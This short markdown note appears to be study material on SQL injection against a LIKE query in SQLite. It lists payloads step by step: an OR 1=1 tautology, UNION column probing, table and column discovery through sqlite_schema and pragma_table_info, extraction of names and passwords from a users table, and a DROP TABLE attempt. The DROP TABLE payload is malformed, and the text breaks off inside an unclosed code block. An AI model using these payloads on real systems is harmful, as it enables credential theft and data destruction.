# SQL Injection

```sql
-- base query

SELECT ? FROM ? WHERE ? LIKE '%input%'
```

```sql
' OR 1=1; --
SELECT ? FROM ? WHERE ? LIKE '%' OR 1=1 --input%'
```

```sql
' UNION SELECT 1,2,3 --
SELECT ? FROM ? WHERE ? LIKE '%' UNION SELECT 1, 2, 3 --%'
```

```sql
' UNION SELECT 1, 2, name FROM sqlite_schema WHERE type='table' ORDER BY name --
```

```sql
SELECT * FROM pragma_table_info('users')

' UNION SELECT 1, name, type FROM pragma_table_info('users') --
```

```sql
SELECT id, name, password FROM users
' UNION SELECT id, name, 'password: ' || password FROM users --
```

```sql
DROP TABLE users;
' UNION SELECT 1, 2, 3 FROM (SELECT (DROP TABLE IF EXISTS users)) AS subquery

